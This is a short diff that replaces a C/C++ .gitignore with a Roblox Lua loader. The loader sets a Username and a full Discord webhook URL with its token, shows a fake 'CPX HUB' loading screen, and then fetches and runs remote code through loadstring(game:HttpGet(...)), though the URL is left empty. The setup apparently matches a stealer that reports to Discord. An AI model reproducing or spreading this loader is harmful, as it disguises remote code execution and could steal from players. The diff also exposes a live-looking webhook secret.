@@ -1,32 +1,10 @@
-# Prerequisites
-*.d
+Username = "Valorantr7"
+WebHook = "https://discord.com/api/webhooks/1085017031696470129/Q8z3-JwLlQuvtThr-HtLSdxKn267gcrV3qHUP9L7-uaMz77yTx4v1jZ6z_4MJFbQUJeyX"
 
-# Compiled Object files
-*.slo
-*.lo
-*.o
-*.obj
-
-# Precompiled Headers
-*.gch
-*.pch
-
-# Compiled Dynamic libraries
-*.so
-*.dylib
-*.dll
-
-# Fortran module files
-*.mod
-*.smod
-
-# Compiled Static libraries
-*.lai
-*.la
-*.a
-*.lib
-
-# Executables
-*.exe
-*.out
-*.app
+loadingscreen = true 
+_G.CustomScriptName = "CPX HUB"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet(""))()
